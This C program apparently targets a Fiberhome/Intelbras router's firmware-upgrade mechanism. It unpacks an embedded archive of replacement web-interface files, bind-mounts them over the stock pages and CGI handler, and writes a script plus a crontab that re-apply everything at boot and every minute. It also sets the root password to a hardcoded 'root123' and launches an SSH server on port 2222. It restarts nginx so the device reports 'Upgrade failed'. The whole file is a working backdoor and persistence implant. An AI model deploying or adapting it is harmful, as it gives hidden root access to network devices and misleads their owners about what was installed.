#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>

extern char _binary__tmp_current_payload_tar_gz_start[];
extern char _binary__tmp_current_payload_tar_gz_end[];

static const char *files[] = {
    "cgi-bin/ajax", "menu/sub_menu_admin_inter",
    "css/index.css", "css/main_style.css", "css/mainLeft.css",
    "image/logo_Intelbras_fiberhome.png",
    "html/broadband_inter.html", "html/login_inter.html",
    "html/main_inter.html", "html/snpwdauth_inter.html",
    "html/voice_base_inter.html", "html/ddns_new_inter.html",
    "js/broadband_inter.js", "js/ddns_new_inter.js",
    "js/logView.js", "js/page_access_check.js", "js/access.js",
    "js/snpwdauth_inter.js", "js/util.js", "js/voice_base_inter.js",
    "js/xhr.js", "js/wlanAdvancedSettings_inter.js",
    "js/wlanAdvancedSettings_5G_inter.js", "js/wlanGuset_inter.js",
    NULL
};

static const char apply_script[] =
    "#!/bin/sh\n"
    "T=/fhconf/custom-webui\n"
    "for f in $(find $T -type f -not -name apply.sh); do\n"
    "  target=/www/${f#$T/}\n"
    "  [ -f \"$target\" ] && mount --bind \"$f\" \"$target\"\n"
    "done\n"
    "echo root:root123 | chpasswd 2>/dev/null\n"
    "pidof dropbear > /dev/null || { /fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa 2>/dev/null; /fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa 2>/dev/null; }\n";

static const char crontab[] = "SHELL=/bin/sh\n@reboot sleep 20 && /fhconf/custom-webui/apply.sh\n* * * * * /fhconf/custom-webui/apply.sh\n";

int main() {
    size_t sz = _binary__tmp_current_payload_tar_gz_end - _binary__tmp_current_payload_tar_gz_start;
    FILE *f;
    char src[256], dst[256];
    int i;

    /* Extract to /var/www-custom/ (immediate use) */
    system("mkdir -p /var/www-custom/cgi-bin /var/www-custom/css "
           "/var/www-custom/html /var/www-custom/image "
           "/var/www-custom/js /var/www-custom/menu");

    f = fopen("/tmp/payload.tar.gz", "w");
    if (f) { fwrite(_binary__tmp_current_payload_tar_gz_start, 1, sz, f); fclose(f); }
    system("tar xzf /tmp/payload.tar.gz -C /var/www-custom");
    system("chmod +x /var/www-custom/cgi-bin/ajax");

    /* Also extract to /fhconf/custom-webui/ (persistent) */
    system("mkdir -p /fhconf/custom-webui/cgi-bin /fhconf/custom-webui/css "
           "/fhconf/custom-webui/html /fhconf/custom-webui/image "
           "/fhconf/custom-webui/js /fhconf/custom-webui/menu");
    system("tar xzf /tmp/payload.tar.gz -C /fhconf/custom-webui");
    system("chmod +x /fhconf/custom-webui/cgi-bin/ajax");

    /* Apply bind mounts (immediate) */
    for (i = 0; files[i]; i++) {
        snprintf(src, sizeof(src), "/var/www-custom/%s", files[i]);
        snprintf(dst, sizeof(dst), "/www/%s", files[i]);
        if (access(src, 0) == 0 && access(dst, 0) == 0) {
            umount(dst);
            mount(src, dst, NULL, MS_BIND, NULL);
        }
    }

    /* Write persistence script */
    f = fopen("/fhconf/custom-webui/apply.sh", "w");
    if (f) { fwrite(apply_script, 1, sizeof(apply_script)-1, f); fclose(f); }
    chmod("/fhconf/custom-webui/apply.sh", 0755);

    /* Write crontab (persistent) */
    f = fopen("/fhconf/crontab_conf", "w");
    if (f) { fwrite(crontab, 1, sizeof(crontab)-1, f); fclose(f); }

    /* Root access (immediate) */
    system("echo root:root123|chpasswd");
    system("/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa 2>/dev/null");
    system("/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa 2>/dev/null");

    /* Kill + restart nginx (triggers "Upgrade failed") */
    system("sh -c 'sleep 3; kill $(pidof nginx); sleep 1; LD_LIBRARY_PATH=/fhrom/lib:/lib /fhrom/bin/nginx -c /fhconf/nginx.conf' &");

    return 0;
}
